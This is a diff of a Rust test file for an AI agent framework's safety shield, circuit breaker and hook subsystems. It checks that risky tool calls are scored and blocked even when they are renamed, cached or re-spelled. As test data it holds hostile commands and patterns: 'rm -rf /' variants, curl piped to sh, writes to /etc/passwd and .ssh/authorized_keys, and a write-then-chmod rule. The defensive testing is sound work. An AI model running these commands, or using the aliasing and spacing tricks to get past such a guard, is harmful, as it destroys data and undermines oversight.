@@ -1,11 +1,9 @@
-//! Contracts for the three previously-unwired subsystems (L-77).
-//!
-//! Pins that the engine consults the tool-health breaker before
-//! dispatch (an open breaker yields a soft refusal the model sees;
+//! Contracts for three engine-consulted subsystems: the tool-health
+//! breaker (an open breaker yields a soft refusal the model sees;
 //! a closed breaker dispatches regardless of score; recovery is
-//! single-flight), that pre-compact hook instructions reach the
-//! compactor and accumulate across hooks, and that the installed
-//! `SafetyShieldMiddleware` enforces `Block` decisions with scoring
+//! single-flight), pre-compact hook instructions reaching the
+//! compactor and accumulating across hooks, and the installed
+//! `SafetyShieldMiddleware` enforcing `Block` decisions with scoring
 //! that is token-boundary-disciplined and polymorphism-proof (case,
 //! spacing, flag spellings; pinned by a randomized oracle-agreement
 //! property over multiple seeds), blocked attempts never feed the
@@ -14,8 +12,6 @@
 //! concurrent-wave contracts drive all three wires together, with
 //! randomized conservation sweeps (sequential and parallel) running
 //! under multiple seeds.
-//! Recreated 2026-08-26 per the L-77 re-assessment — the original
-//! proof-of-gap file was lost with an unmerged branch.
 //!
 //! Requires `testing`, `tool_health`, `hooks`, and `tool_shield`.
 
@@ -394,8 +390,14 @@ mod hook_guidance {
 #[cfg(all(feature = "testing", feature = "tool_shield"))]
 mod shield_enforcement {
     use super::*;
-    use loopctl::middleware::{SafetyShieldMiddleware, ToolPipeline};
-    use loopctl::tool::shield::{SafetyDecision, ShieldContext, ToolSafetyShield, UnixShield};
+    use loopctl::middleware::{
+        MemoizingMiddleware, NoopPathExtractor, SafetyShieldMiddleware, ToolDispatchContext,
+        ToolDispatchResult, ToolMiddleware, ToolPipeline,
+    };
+    use loopctl::tool::shield::{
+        CombinationRule, RiskPattern, SafetyDecision, ShieldContext, ToolSafetyShield, UnixShield,
+        UnixShieldBuilder,
+    };
 
     /// A shield that allows everything and counts its invocations.
     struct RecordingShield {
@@ -422,6 +424,27 @@ mod shield_enforcement {
         }
     }
 
+    /// Rewrites every call's tool name — the aliasing layer the
+    /// ordering pins install outside the shield.
+    pub(super) struct RenamingMiddleware {
+        /// The name every call is rewritten to.
+        pub(super) new_name: String,
+    }
+
+    impl ToolMiddleware for RenamingMiddleware {
+        fn name(&self) -> &'static str {
+            "renaming"
+        }
+        fn dispatch<'a>(
+            &'a self,
+            ctx: &'a mut ToolDispatchContext,
+            next: &'a ToolPipeline,
+        ) -> Pin<Box<dyn Future<Output = ToolDispatchResult> + Send + 'a>> {
+            ctx.tool_name = self.new_name.clone();
+            Box::pin(async move { next.dispatch(ctx).await })
+        }
+    }
+
     /// A tool that counts executions and always succeeds.
     struct CountingTool {
         /// One entry per execution.
@@ -431,6 +454,45 @@ mod shield_enforcement {
     impl Tool for CountingTool {
         fn name(&self) -> &'static str {
             "Bash"
+        }
+        fn description(&self) -> &'static str {
+            "Counts"
+        }
+        fn schema(&self) -> ToolSchema {
+            ToolSchema {
+                tool: self.name().to_string(),
+                description: self.description().to_string(),
+                input_schema: serde_json::json!({
+                    "type": "object",
+                    "properties": {"command": {"type": "string"}}
+                }),
+            }
+        }
+        fn call(
+            &self,
+            _input: serde_json::Value,
+            _ctx: &ToolContext,
+        ) -> Pin<Box<dyn Future<Output = Result<ToolOutput, ToolError>> + Send + '_>> {
+            let executions = Arc::clone(&self.executions);
+            Box::pin(async move {
+                executions.lock().expect("log lock").push(());
+                Ok(ToolOutput::text("ran"))
+            })
+        }
+    }
+
+    /// A tool answering to a fixed name that counts executions and
+    /// always succeeds — the requested-name side of the aliasing pins.
+    struct NamedTool {
+        /// The name this tool answers to.
+        name: &'static str,
+        /// One entry per execution.
+        executions: Arc<Mutex<Vec<()>>>,
+    }
+
+    impl Tool for NamedTool {
+        fn name(&self) -> &'static str {
+            self.name
         }
         fn description(&self) -> &'static str {
             "Counts"
@@ -527,6 +589,74 @@ mod shield_enforcement {
         assert!(
             refusal.contains("blocked by safety shield"),
             "the soft error names the shield's refusal: {refusal}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_rewritten_watched_tool_is_shield_evaluated() {
+        // Ordering contract: the rewriter sits outside the shield
+        // (registered first), so the shield evaluates the final name —
+        // a call issued as `harmless` is blocked as the watched `Bash`
+        // it is rewritten into. With the rewriter inside the shield,
+        // the alias would redirect after evaluation and run unshielded.
+        let executions = Arc::new(Mutex::new(Vec::new()));
+        let requested_executions = Arc::new(Mutex::new(Vec::new()));
+        let responses = vec![
+            MockResponse {
+                text: "go".to_string(),
+                tool_call: Some(MockToolCall {
+                    id: "c1".to_string(),
+                    name: "harmless".to_string(),
+                    input: serde_json::json!({"command": "danger"}),
+                }),
+                stop_reason: "tool_use".to_string(),
+            },
+            MockResponse {
+                text: "done".to_string(),
+                tool_call: None,
+                stop_reason: "end_turn".to_string(),
+            },
+        ];
+        let client = MockApiClient::new("m").with_responses(responses);
+        let mut registry = ToolRegistry::new();
+        registry.register(NamedTool {
+            name: "harmless",
+            executions: Arc::clone(&requested_executions),
+        });
+        registry.register(CountingTool {
+            executions: Arc::clone(&executions),
+        });
+        let mut loop_ = BareLoop::new(Arc::new(client), registry, SessionConfig::default());
+        loop_
+            .set_pipeline(
+                ToolPipeline::builder()
+                    .with_middleware(RenamingMiddleware {
+                        new_name: "Bash".to_string(),
+                    })
+                    .with_middleware(SafetyShieldMiddleware::new(Arc::new(RecordingShield {
+                        recorded: Arc::new(Mutex::new(Vec::new())),
+                    }))),
+            )
+            .expect("static pipeline composition is valid");
+        loop_
+            .run("alias evaluated", &RunConfig::default())
+            .await
+            .expect("run completes");
+
+        assert!(
+            executions.lock().expect("log lock").is_empty(),
+            "the rewritten watched tool is evaluated — and blocked — under \
+             its final name"
+        );
+        assert!(
+            requested_executions.lock().expect("log lock").is_empty(),
+            "the block happens after the rewrite — the requested-name tool \
+             never runs either"
+        );
+        let refusal = refusal_text(&loop_);
+        assert!(
+            refusal.contains("blocked by safety shield"),
+            "the refusal names the shield, not an execution outcome: {refusal}"
         );
     }
 
@@ -714,6 +844,284 @@ mod shield_enforcement {
         );
     }
 
+    #[test]
+    fn a_combination_only_shield_still_names_its_trigger_tools() {
+        // The watched set must cover every tool the shield wants to
+        // see, not just those with patterns — otherwise the
+        // middleware's watched gate skips evaluation and recording
+        // for a combination-only shield and its rules never fire.
+        let shield = UnixShieldBuilder::blank()
+            .with_combination_rule(CombinationRule {
+                description: "write then execute",
+                score: 0.75,
+                triggers: &[("Write", None), ("Bash", Some("chmod +x"))],
+            })
+            .build();
+        let watched = shield.watched_tools();
+        assert!(
+            watched.contains("Write") && watched.contains("Bash"),
+            "combination trigger tools are watched: {watched:?}"
+        );
+    }
+
+    #[test]
+    fn an_empty_pattern_matches_nothing() {
+        // The edge-aware rule drops a boundary constraint beside a
+        // symbol edge; an empty pattern has no edges at all, so
+        // without a guard its needle matches at every position and
+        // the score applies to every call of the tool. Whitespace-only
+        // patterns are the same class (they normalize to a single
+        // space). The guard also covers combination-rule triggers,
+        // where an empty substring advanced on every call to the
+        // named tool.
+        let shield = UnixShieldBuilder::blank()
+            .with_pattern(
+                "Bash",
+                vec![
+                    RiskPattern {
+                        name: "empty",
+                        score: 0.9,
+                        pattern: "",
+                    },
+                    RiskPattern {
+                        name: "blank",
+                        score: 0.9,
+                        pattern: "   ",
+                    },
+                ],
+            )
+            .build();
+        assert_eq!(
+            shield.assess_single_tool_risk("Bash", &serde_json::json!({"command": "ls"})),
+            0.0,
+            "an empty or whitespace-only pattern must not score"
+        );
+
+        let shield = UnixShieldBuilder::blank()
+            .with_combination_rule(CombinationRule {
+                description: "empty trailing trigger",
+                score: 0.85,
+                triggers: &[("Bash", Some("x")), ("Bash", Some(""))],
+            })
+            .build();
+        shield.record_invocation("Bash", &serde_json::json!({"command": "x"}), true);
+        assert_eq!(
+            shield.assess_combination(&ShieldContext {
+                tool_name: "Bash".to_string(),
+                input: serde_json::json!({"command": "y"}),
+                turn: 1,
+                recent_calls: Vec::new(),
+            }),
+            0.0,
+            "an empty trigger substring must not advance the rule — `None` \
+             is the any-call trigger"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_shield_watching_nothing_is_never_consulted() {
+        // The empty watched set is the configured-off side of the
+        // middleware's gate: evaluation and recording are both
+        // skipped, so a shield that would block everything if
+        // consulted changes nothing.
+        struct WatchingNothing {
+            recorded: Arc<Mutex<Vec<bool>>>,
+        }
+        impl ToolSafetyShield for WatchingNothing {
+            fn evaluate(&self, _ctx: &ShieldContext) -> SafetyDecision {
+                SafetyDecision::block("would have blocked".to_string(), "test")
+            }
+            fn watched_tools(&self) -> std::collections::HashSet<String> {
+                std::collections::HashSet::new()
+            }
+            fn record_invocation(
+                &self,
+                _tool_name: &str,
+                _input: &serde_json::Value,
+                success: bool,
+            ) {
+                self.recorded.lock().expect("record lock").push(success);
+            }
+        }
+        let executions = Arc::new(Mutex::new(Vec::new()));
+        let recorded = Arc::new(Mutex::new(Vec::new()));
+        let mut loop_ = shielded_loop(
+            CountingTool {
+                executions: Arc::clone(&executions),
+            },
+            Arc::new(WatchingNothing {
+                recorded: Arc::clone(&recorded),
+            }),
+            "rm -rf /",
+        );
+        loop_
+            .run("nothing watched", &RunConfig::default())
+            .await
+            .expect("run completes");
+
+        assert_eq!(
+            executions.lock().expect("log lock").len(),
+            1,
+            "an empty watched set skips the shield entirely — the call \
+             executes"
+        );
+        assert!(
+            recorded.lock().expect("record lock").is_empty(),
+            "no recording either — the skip is total"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_cache_hit_is_still_shield_recorded_when_the_shield_sits_outside_memoize() {
+        // Ordering contract against the memoizer: the shield outside
+        // (registered before) the cache evaluates and records every
+        // call — including a repeat served from cache — because the
+        // repetition dimension scores the model's behavior, not the
+        // tool's execution.
+        let executions = Arc::new(Mutex::new(Vec::new()));
+        let recorded = Arc::new(Mutex::new(Vec::new()));
+        let responses = vec![
+            MockResponse {
+                text: "go".to_string(),
+                tool_call: Some(MockToolCall {
+                    id: "c1".to_string(),
+                    name: "Bash".to_string(),
+                    input: serde_json::json!({"command": "echo once"}),
+                }),
+                stop_reason: "tool_use".to_string(),
+            },
+            MockResponse {
+                text: "again".to_string(),
+                tool_call: Some(MockToolCall {
+                    id: "c2".to_string(),
+                    name: "Bash".to_string(),
+                    input: serde_json::json!({"command": "echo once"}),
+                }),
+                stop_reason: "tool_use".to_string(),
+            },
+            MockResponse {
+                text: "done".to_string(),
+                tool_call: None,
+                stop_reason: "end_turn".to_string(),
+            },
+        ];
+        let client = MockApiClient::new("m").with_responses(responses);
+        let mut registry = ToolRegistry::new();
+        registry.register(CountingTool {
+            executions: Arc::clone(&executions),
+        });
+        let mut loop_ = BareLoop::new(Arc::new(client), registry, SessionConfig::default());
+        loop_
+            .set_pipeline(
+                ToolPipeline::builder()
+                    .with_middleware(SafetyShieldMiddleware::new(Arc::new(RecordingShield {
+                        recorded: Arc::clone(&recorded),
+                    })))
+                    .with_middleware(MemoizingMiddleware::new(
+                        vec!["Bash".to_string()],
+                        Vec::new(),
+                        Arc::new(NoopPathExtractor),
+                        10,
+                    )),
+            )
+            .expect("static pipeline composition is valid");
+        loop_
+            .run("repeat under the shield", &RunConfig::default())
+            .await
+            .expect("run completes");
+
+        assert_eq!(
+            executions.lock().expect("log lock").len(),
+            1,
+            "the identical repeat is served from the cache"
+        );
+        assert_eq!(
+            recorded.lock().expect("record lock").len(),
+            2,
+            "the shield sees both calls — the cache-served repeat is still \
+             evaluated and recorded"
+        );
+    }
+
+    #[tokio::test]
+    async fn the_recent_calls_snapshot_is_bounded_to_a_recency_window() {
+        // The middleware's snapshot is a recency view, not a session
+        // archive: bounded like the reference shield's own history,
+        // so the per-evaluation clone stays constant-cost and the two
+        // history mechanisms agree on the window.
+        type SnapshotLog = Vec<Vec<(String, usize)>>;
+        struct CapturingShield {
+            snapshots: Arc<Mutex<SnapshotLog>>,
+        }
+        impl ToolSafetyShield for CapturingShield {
+            fn evaluate(&self, ctx: &ShieldContext) -> SafetyDecision {
+                self.snapshots
+                    .lock()
+                    .expect("snap lock")
+                    .push(ctx.recent_calls.clone());
+                SafetyDecision::allow()
+            }
+            fn watched_tools(&self) -> std::collections::HashSet<String> {
+                ["Bash".to_string()].into_iter().collect()
+            }
+            fn record_invocation(&self, _tool_name: &str, _input: &serde_json::Value, _s: bool) {}
+        }
+        let executions = Arc::new(Mutex::new(Vec::new()));
+        let snapshots = Arc::new(Mutex::new(Vec::new()));
+        let mut responses = Vec::new();
+        for i in 0..22 {
+            responses.push(MockResponse {
+                text: "go".to_string(),
+                tool_call: Some(MockToolCall {
+                    id: format!("c{i}"),
+                    name: "Bash".to_string(),
+                    input: serde_json::json!({"command": format!("cmd {i}")}),
+                }),
+                stop_reason: "tool_use".to_string(),
+            });
+        }
+        responses.push(MockResponse {
+            text: "done".to_string(),
+            tool_call: None,
+            stop_reason: "end_turn".to_string(),
+        });
+        let client = MockApiClient::new("m").with_responses(responses);
+        let mut registry = ToolRegistry::new();
+        registry.register(CountingTool {
+            executions: Arc::clone(&executions),
+        });
+        let mut loop_ = BareLoop::new(Arc::new(client), registry, SessionConfig::default());
+        loop_
+            .set_pipeline(
+                ToolPipeline::builder().with_middleware(SafetyShieldMiddleware::new(Arc::new(
+                    CapturingShield {
+                        snapshots: Arc::clone(&snapshots),
+                    },
+                ))),
+            )
+            .expect("static pipeline composition is valid");
+        loop_
+            .run("windowed snapshot", &RunConfig::default())
+            .await
+            .expect("run completes");
+
+        let snapshots = snapshots.lock().expect("snap lock");
+        let last = snapshots.last().expect("every watched call was evaluated");
+        assert_eq!(
+            last.len(),
+            20,
+            "the snapshot is windowed, not a session archive"
+        );
+        assert!(
+            last.contains(&("Bash".to_string(), 20)),
+            "the most recent turns are present"
+        );
+        assert!(
+            !last.contains(&("Bash".to_string(), 0)),
+            "the oldest calls age out"
+        );
+    }
+
     /// Deterministic LCG for the matcher property.
     struct Lcg(u64);
 
@@ -733,14 +1141,20 @@ mod shield_enforcement {
     /// An alphabet that cannot itself form any shield pattern.
     const NOISE: &[u8] = b"xqzv0123456789";
 
-    /// Randomize the case and thicken the whitespace runs of `text`:
-    /// the matcher must see through both.
+    /// Randomize the case and thicken or delete the whitespace of
+    /// `text`: the matcher must see through case, spacing, and
+    /// compaction (`| sh` folding into `|sh`).
     fn polymorphic(rng: &mut Lcg, text: &str) -> String {
         let mut out = String::new();
         for ch in text.chars() {
             if ch == ' ' {
-                for _ in 0..1 + rng.below(3) {
-                    out.push(' ');
+                match rng.below(4) {
+                    0 => {}
+                    n => {
+                        for _ in 0..n {
+                            out.push(' ');
+                        }
+                    }
                 }
             } else if rng.below(2) == 0 {
                 out.extend(ch.to_uppercase());
@@ -770,13 +1184,20 @@ mod shield_enforcement {
         out
     }
 
-    /// Independent oracle: `pattern` occurs on token boundaries.
+    /// Independent oracle: `pattern` occurs on token boundaries — a
+    /// boundary is required only beside a word-character pattern edge.
     fn bounded(input: &str, pattern: &str) -> bool {
+        let lead = pattern.chars().next().is_some_and(char::is_alphanumeric);
+        let tail = pattern
+            .chars()
+            .next_back()
+            .is_some_and(char::is_alphanumeric);
         input.match_indices(pattern).any(|(start, matched)| {
             let end = start + matched.len();
             let b = input[..start].chars().next_back();
             let a = input[end..].chars().next();
-            b.is_none_or(|c| !c.is_alphanumeric()) && a.is_none_or(|c| !c.is_alphanumeric())
+            (!lead || b.is_none_or(|c| !c.is_alphanumeric()))
+                && (!tail || a.is_none_or(|c| !c.is_alphanumeric()))
         })
     }
 
@@ -789,14 +1210,15 @@ mod shield_enforcement {
             ("sudo", 0.6),
             ("chmod 777", 0.5),
             ("| sh", 0.8),
+            ("|sh", 0.8),
             ("curl", 0.3),
             ("wget", 0.3),
         ];
         for seed in [0x600D_5EED_u64, 0xA11C_E5EED] {
             let mut rng = Lcg(seed);
             for _ in 0..2000 {
-                let &(pattern, score) = &patterns[rng.below(patterns.len() as u64) as usize];
-                let embedded = polymorphic(&mut rng, pattern);
+                let &(chosen, _) = &patterns[rng.below(patterns.len() as u64) as usize];
+                let embedded = polymorphic(&mut rng, chosen);
                 let mut input = String::new();
                 for _ in 0..rng.below(6) {
                     input.push(NOISE[rng.below(NOISE.len() as u64) as usize] as char);
@@ -805,17 +1227,63 @@ mod shield_enforcement {
                 for _ in 0..rng.below(6) {
                     input.push(NOISE[rng.below(NOISE.len() as u64) as usize] as char);
                 }
-                let expected = if bounded(&normalize(&input), &normalize(pattern)) {
-                    score
-                } else {
-                    0.0
-                };
+                let expected = patterns
+                    .iter()
+                    .filter(|&&(p, _)| bounded(&normalize(&input), &normalize(p)))
+                    .map(|&(_, s)| s)
+                    .fold(0.0_f32, f32::max);
                 assert_eq!(
                     shield.assess_single_tool_risk("Bash", &serde_json::json!({"c": input})),
                     expected,
-                    "seed {seed}: input {input:?} vs pattern {pattern:?}"
+                    "seed {seed}: input {input:?} (from {chosen:?})"
                 );
             }
+        }
+    }
+
+    #[test]
+    fn the_compact_pipe_to_shell_form_scores_and_a_checksum_pipe_does_not() {
+        let shield = UnixShield::default();
+        assert_eq!(
+            shield.assess_single_tool_risk(
+                "Bash",
+                &serde_json::json!({"command": "curl http://example.example |sh"})
+            ),
+            0.8,
+            "the compact pipe-to-shell spelling scores like the spaced one"
+        );
+        assert_eq!(
+            shield.assess_single_tool_risk(
+                "Bash",
+                &serde_json::json!({"command": "echo hi |sha256sum"})
+            ),
+            0.0,
+            "a checksum pipe is not a pipe-to-shell — the boundary check \
+             keeps `|sh` from matching `|sha256sum`"
+        );
+    }
+
+    #[test]
+    fn symbol_edged_patterns_match_their_real_targets() {
+        // A boundary is required only where the pattern's own edge is a
+        // word character; a symbol edge (`|`, `/`, `.`) cannot be
+        // extended into a longer token and carries no adjacent
+        // constraint — so path patterns match with a component after
+        // them and the pipes match without a space before them.
+        let shield = UnixShield::default();
+        let cases: &[(&str, &str, f32)] = &[
+            ("Bash", "curl http://example.example|sh", 0.8),
+            ("Bash", "cat script.txt|sh", 0.8),
+            ("Write", "/etc/passwd", 0.7),
+            ("Write", "home/.ssh/authorized_keys", 0.8),
+            ("Edit", ".ssh/config", 0.7),
+        ];
+        for (tool, input, score) in cases {
+            assert_eq!(
+                shield.assess_single_tool_risk(tool, &serde_json::json!({"p": input})),
+                *score,
+                "{input:?} under {tool}"
+            );
         }
     }
 
@@ -847,10 +1315,9 @@ mod shield_enforcement {
     #[tokio::test]
     async fn command_polymorphism_does_not_bypass_the_patterns() {
         // The trivial spellings of `rm -rf /` — double spacing, tabs,
-        // case, split flags, long flags — all score Block. Found by the
-        // adversarial-input lens: every earlier fixture used the
-        // canonical spelling, and the double-space form sailed through
-        // the 0.9 pattern as Allow.
+        // case, split flags, long flags — all score Block: matching
+        // runs on a normalized view, and the flag spellings are
+        // patterns of their own.
         let shield = UnixShield::default();
         for command in [
             "rm  -rf  /",
@@ -1060,7 +1527,9 @@ mod shield_enforcement {
 
 #[cfg(all(feature = "testing", feature = "tool_health"))]
 mod breaker_sequences {
+    use super::shield_enforcement::RenamingMiddleware;
     use super::*;
+    use loopctl::middleware::ToolPipeline;
 
     /// A tool whose outcome follows a script, counting executions.
     struct ScriptedTool {
@@ -1158,6 +1627,39 @@ mod breaker_sequences {
         let mut loop_ = BareLoop::new(Arc::new(client), registry, SessionConfig::default());
         loop_.set_health_registry(health);
         loop_
+    }
+
+    /// A tool that always succeeds and counts executions.
+    struct HealthyTool {
+        /// One entry per execution.
+        executions: Arc<Mutex<Vec<()>>>,
+    }
+
+    impl Tool for HealthyTool {
+        fn name(&self) -> &'static str {
+            "healthy"
+        }
+        fn description(&self) -> &'static str {
+            "Always succeeds"
+        }
+        fn schema(&self) -> ToolSchema {
+            ToolSchema {
+                tool: self.name().to_string(),
+                description: self.description().to_string(),
+                input_schema: serde_json::json!({"type": "object"}),
+            }
+        }
+        fn call(
+            &self,
+            _input: serde_json::Value,
+            _ctx: &ToolContext,
+        ) -> Pin<Box<dyn Future<Output = Result<ToolOutput, ToolError>> + Send + '_>> {
+            let executions = Arc::clone(&self.executions);
+            Box::pin(async move {
+                executions.lock().expect("log lock").push(());
+                Ok(ToolOutput::text("ok"))
+            })
+        }
     }
 
     #[tokio::test]
@@ -1265,6 +1767,80 @@ mod breaker_sequences {
             4,
             "zero cooldown: every call is either the trip, a probe, or a \
              post-close dispatch — nothing is refused"
+        );
+    }
+
+    #[tokio::test]
+    async fn the_gate_keys_on_the_requested_name_across_a_renaming_middleware() {
+        // Documented seam: the resolved name exists only inside the
+        // pipeline (middleware rewrite ctx.tool_name on the way to the
+        // core), so the gate consults the requested name's breaker. A
+        // call whose requested name's breaker is open is refused even
+        // though a renaming middleware would have redirected it to a
+        // healthy tool — the gate's key and health recording's key
+        // diverge exactly when something renames.
+        let executions = Arc::new(Mutex::new(Vec::new()));
+        let responses = vec![
+            MockResponse {
+                text: "go".to_string(),
+                tool_call: Some(MockToolCall {
+                    id: "c1".to_string(),
+                    name: "scripted".to_string(),
+                    input: serde_json::json!({}),
+                }),
+                stop_reason: "tool_use".to_string(),
+            },
+            MockResponse {
+                text: "done".to_string(),
+                tool_call: None,
+                stop_reason: "end_turn".to_string(),
+            },
+        ];
+        let client = MockApiClient::new("m").with_responses(responses);
+        let mut registry = ToolRegistry::new();
+        registry.register(ScriptedTool {
+            executions: Arc::new(Mutex::new(Vec::new())),
+            script: Vec::new(),
+        });
+        registry.register(HealthyTool {
+            executions: Arc::clone(&executions),
+        });
+        let health = Arc::new(ToolHealthRegistry::new().with_config(
+            loopctl::tool::health::CircuitBreakerConfig {
+                failure_threshold: 1,
+                recovery_duration: std::time::Duration::from_secs(60),
+                probe_timeout: std::time::Duration::from_secs(60),
+            },
+        ));
+        health.record_failure("scripted", std::time::Duration::ZERO);
+        let mut loop_ = BareLoop::new(Arc::new(client), registry, SessionConfig::default());
+        loop_.set_health_registry(health);
+        loop_
+            .set_pipeline(ToolPipeline::builder().with_middleware(RenamingMiddleware {
+                new_name: "healthy".to_string(),
+            }))
+            .expect("static pipeline composition is valid");
+        loop_
+            .run("renamed but refused", &RunConfig::default())
+            .await
+            .expect("run completes");
+
+        assert!(
+            executions.lock().expect("log lock").is_empty(),
+            "the gate refuses on the requested name before any rename"
+        );
+        let refusal = loop_
+            .conversation()
+            .iter()
+            .flat_map(|m| m.parts.iter())
+            .find_map(|p| match p {
+                MessagePart::ToolResult { output, .. } => Some(output.to_string()),
+                _ => None,
+            })
+            .unwrap_or_default();
+        assert!(
+            refusal.contains("circuit breaker open"),
+            "the refusal is the breaker's, not an execution outcome: {refusal}"
         );
     }
 }
